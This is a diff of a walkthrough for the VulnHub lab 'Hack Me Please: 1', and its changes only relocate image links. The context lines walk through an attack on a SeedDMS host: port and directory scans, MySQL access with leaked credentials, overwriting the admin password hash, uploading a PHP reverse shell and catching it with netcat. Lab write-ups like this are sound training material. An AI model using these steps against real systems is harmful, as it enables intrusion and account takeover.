@@ -3,7 +3,7 @@
 - **Machine:** Hack Me Please: 1
 - **Download:** https://www.vulnhub.com/entry/hack-me-please-1,731/
 
-![](812-1.png)
+![](images/812-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](812-2.png)
+![](images/812-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Run a complete Nmap scan to identify open ports, services, OS information, and d
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.181
 ```
 
-![](812-3.png)
+![](images/812-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ Perform an aggressive scan using the `http-enum` NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.244
 ```
 
-![](812-4.png)
+![](images/812-4.png)
 
 ---
 
@@ -76,13 +76,13 @@ Visit the target application.
 
 View the page source.
 
-![](812-5.png)
+![](images/812-5.png)
 
 Open the JavaScript file.
 
 - http://192.168.2.244/js/main.js
 
-![](812-6.png)
+![](images/812-6.png)
 
 A hidden SeedDMS application is discovered.
 
@@ -90,7 +90,7 @@ Visit:
 
 - http://192.168.2.244/seeddms51x/seeddms-5.1.22
 
-![](812-7.png)
+![](images/812-7.png)
 
 ---
 
@@ -102,7 +102,7 @@ Enumerate directories.
 gobuster dir -u http://192.168.2.244/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php -t 50
 ```
 
-![](812-8.png)
+![](images/812-8.png)
 
 Enumerate the configuration directory.
 
@@ -110,13 +110,13 @@ Enumerate the configuration directory.
 gobuster dir -u http://192.168.2.244/seeddms51x/conf -w /usr/share/wordlists/dirb/common.txt -x xml,txt,bak,conf
 ```
 
-![](812-9.png)
+![](images/812-9.png)
 
 Visit the discovered configuration file.
 
 - http://192.168.2.244/seeddms51x/conf/settings.xml
 
-![](812-10.png)
+![](images/812-10.png)
 
 ---
 
@@ -128,7 +128,7 @@ Connect to the exposed MySQL service.
 mysql --skip-ssl -h 192.168.2.244 -u seeddms -pseeddms
 ```
 
-![](812-11.png)
+![](images/812-11.png)
 
 Display the available databases.
 
@@ -148,7 +148,7 @@ List all tables.
 SHOW TABLES;
 ```
 
-![](812-12.png)
+![](images/812-12.png)
 
 Enumerate user information.
 
@@ -160,7 +160,7 @@ SELECT * FROM users;
 SELECT * FROM tblUsers;
 ```
 
-![](812-13.png)
+![](images/812-13.png)
 
 ---
 
@@ -170,7 +170,7 @@ Try logging into the SeedDMS portal using the recovered credentials.
 
 - http://192.168.2.244/seeddms51x/seeddms-5.1.22/out/out.Login.php
 
-![](812-14.png)
+![](images/812-14.png)
 
 The login fails because the stored password is hashed.
 
@@ -184,7 +184,7 @@ Identify the password hash type.
 hash-identifier "f9ef2c539bad8a6d2f3432b6d49ab51a"
 ```
 
-![](812-15.png)
+![](images/812-15.png)
 
 Generate an MD5 hash for a known password.
 
@@ -196,7 +196,7 @@ echo -n "hackme123" | md5sum
 echo -n "hackme123" | md5sum | cut -d ' ' -f1
 ```
 
-![](812-16.png)
+![](images/812-16.png)
 
 Replace the administrator password hash.
 
@@ -204,7 +204,7 @@ Replace the administrator password hash.
 UPDATE tblUsers SET pwd='4d55ef6655de2b4a006ada41db320e6f' WHERE login='admin';
 ```
 
-![](812-17.png)
+![](images/812-17.png)
 
 Login using the updated credentials.
 
@@ -215,11 +215,11 @@ Username : admin
 Password : hackme123
 ```
 
-![](812-18.png)
+![](images/812-18.png)
 
 Successful login.
 
-![](812-19.png)
+![](images/812-19.png)
 
 ---
 
@@ -233,13 +233,13 @@ Search for available SeedDMS exploits.
 searchsploit seeddms
 ```
 
-![](812-20.png)
+![](images/812-20.png)
 
 Review the related Exploit-DB entry.
 
 - https://www.exploit-db.com/exploits/47022
 
-![](812-21.png)
+![](images/812-21.png)
 
 Create a PHP reverse shell.
 
@@ -319,11 +319,11 @@ proc_close($process);
 
 Upload the PHP reverse shell.
 
-![](812-22.png)
+![](images/812-22.png)
 
 Upload completed successfully.
 
-![](812-23.png)
+![](images/812-23.png)
 
 Start a Netcat listener.
 
@@ -339,7 +339,7 @@ http://192.168.2.244/seeddms51x/data/1048576/4/1.php
 
 A reverse shell is established.
 
-![](812-24.png)
+![](images/812-24.png)
 
 ---
 
